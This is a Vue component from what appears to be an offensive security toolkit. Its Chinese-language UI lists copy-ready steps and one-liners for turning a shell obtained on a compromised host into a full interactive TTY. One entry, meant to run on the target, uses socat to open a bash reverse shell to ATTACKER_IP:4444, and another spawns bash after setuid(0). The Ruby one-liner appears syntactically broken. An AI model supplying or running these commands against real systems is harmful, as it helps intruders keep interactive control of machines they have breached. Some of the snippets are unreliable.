<template>
  <div class="space-y-4">
    <div class="rounded-md border p-4" style="border-color: var(--color-border); background-color: var(--color-bg-secondary);">
      <h3 class="text-sm font-medium mb-2" style="color: var(--color-text);">Shell 稳定化步骤</h3>
      <p class="text-xs mb-3" style="color: var(--color-text-muted);">
        获得非交互式 Shell 后，按以下步骤升级为完整的 TTY Shell，支持 Tab 补全、方向键和 Ctrl+C。
      </p>
      <div class="space-y-3">
        <div v-for="(step, idx) in stabilizeSteps" :key="idx" class="flex gap-3 items-start">
          <span class="flex-shrink-0 w-6 h-6 rounded-full flex items-center justify-center text-xs font-medium" style="background-color: var(--color-primary); color: #fff;">{{ idx + 1 }}</span>
          <div class="flex-1">
            <p class="text-xs font-medium mb-1" style="color: var(--color-text);">{{ step.title }}</p>
            <div class="flex items-center gap-2">
              <pre class="flex-1 text-xs font-mono p-2 rounded overflow-x-auto" style="background-color: var(--color-bg-tertiary); color: var(--color-text); white-space: pre-wrap;">{{ step.command }}</pre>
              <CopyButton :text="step.command" />
            </div>
            <p v-if="step.desc" class="text-xs mt-1" style="color: var(--color-text-muted);">{{ step.desc }}</p>
          </div>
        </div>
      </div>
    </div>

    <div>
      <h3 class="text-sm font-medium mb-2" style="color: var(--color-text);">TTY Shell 升级命令</h3>
      <div class="space-y-2">
        <div v-for="(item, idx) in ttyCommands" :key="idx"
          class="reveal-item rounded-md border p-3"
          :style="{ '--i': Math.min(idx, 15), borderColor: 'var(--color-border)', backgroundColor: 'var(--color-bg-secondary)' }"
        >
          <div class="flex items-center justify-between gap-2 mb-1">
            <span class="text-sm font-medium" style="color: var(--color-text);">{{ item.name }}</span>
            <CopyButton :text="item.command" />
          </div>
          <pre class="text-xs font-mono overflow-x-auto p-2 rounded" style="background-color: var(--color-bg-tertiary); color: var(--color-text); white-space: pre-wrap;">{{ item.command }}</pre>
        </div>
      </div>
    </div>
  </div>
</template>

<script setup lang="ts">
import CopyButton from '../../common/CopyButton.vue';

const stabilizeSteps = [
  {
    title: '使用 Python 生成 PTY',
    command: "python3 -c 'import pty;pty.spawn(\"/bin/bash\")'",
    desc: '使用 Python 生成一个功能更完善的 bash Shell，此时 Shell 外观会有改善，但仍无法使用 Tab 补全和方向键。',
  },
  {
    title: '设置终端类型',
    command: 'export TERM=xterm',
    desc: '使终端支持 clear 等命令和颜色显示。',
  },
  {
    title: '后台挂起 Shell',
    command: 'Ctrl + Z',
    desc: '将当前 Shell 放到后台，回到本地终端。',
  },
  {
    title: '开启本地终端原始模式',
    command: 'stty raw -echo; fg',
    desc: '关闭本地终端回显，使 Tab 补全、方向键和 Ctrl+C 可用。然后将后台 Shell 恢复到前台。',
  },
  {
    title: '调整终端尺寸（可选）',
    command: 'stty rows 38 columns 116',
    desc: '根据实际终端大小调整远程 Shell 的行列数，避免显示错位。',
  },
];

const ttyCommands = [
  { name: 'Python3 PTY', command: "python3 -c 'import pty;pty.spawn(\"/bin/bash\")'" },
  { name: 'Python PTY', command: "python -c 'import pty;pty.spawn(\"/bin/bash\")'" },
  { name: 'Python3 PTY (带 os)', command: "python3 -c 'import os,pty;os.setuid(0);pty.spawn(\"/bin/bash\")'" },
  { name: 'Script 命令', command: 'script /dev/null -qc /bin/bash' },
  { name: 'Script 命令 (旧版)', command: 'script -q /dev/null /bin/bash' },
  { name: 'Perl TTY', command: "perl -e 'require \"sys/ioctl.ph\"; my \$tty; ioctl(STDIN, 0x5401, \$tty); my \$pid = fork; die \"fork: \$!\" unless defined \$pid; if (\$pid) { waitpid(\$pid, 0); } else { my \$sess = POSIX::setsid(); my \$slave = ttyname(\$tty); open(STDIN, \"<\", \$slave); open(STDOUT, \">\", \$slave); open(STDERR, \">&STDIN\"); exec(\"/bin/bash\"); }'" },
  { name: 'Ruby TTY', command: "ruby -e 'require \"io/console\"; PTY.spawn(\"/bin/bash\") { |r,w,pid| r.sync=true; loop { r.each_char {|c| print c}; rescue Errno::EIO => e; break } }'" },
  { name: 'Socat 完整 TTY', command: 'socat file:`tty`,raw,echo=0 tcp-listen:4444' },
  { name: '在目标机器连接 Socat', command: 'socat exec:\'bash -li\',pty,stderr,setsid,sigint,sane tcp:ATTACKER_IP:4444' },
  { name: '使用 expect', command: 'expect -c "spawn bash; interact"' },
  { name: '从 /bin/sh 升级', command: '/bin/bash -i' },
  { name: '通过 echo 设置', command: 'echo os.system(\'/bin/bash\')' },
];

</script>
